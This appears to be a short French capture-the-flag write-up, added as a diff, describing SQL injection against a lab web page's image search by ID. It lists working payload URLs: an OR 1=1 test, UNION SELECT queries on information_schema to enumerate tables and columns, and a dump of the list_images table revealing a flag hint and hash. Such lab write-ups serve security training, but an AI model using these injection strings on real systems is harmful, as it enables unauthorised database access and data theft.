@@ -1,0 +1,11 @@
+Sur la page searchimg, pour rechercher les images par ID, la requete ce fait en GET, j'ai donc ajouter dans l'url:
+
+1. http://10.1.1.5/?page=searchimg&id=1 OR 1=1&Submit=Submit -> pour voir si ca marchait
+
+2. http://10.1.1.5/?page=searchimg&id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema=database() -> donne le nom des tables, ici: list_images
+
+3. http://10.1.1.5/?page=searchimg&id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_schema=database()&Submit=Submit -> donne le nom des colonnes
+
+4. http://10.1.1.5/?page=searchimg&id=1 or 1=1 union all select title, comment from list_images&Submit=Submit -> donne le contenu de
+title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+comment: Hack me ?
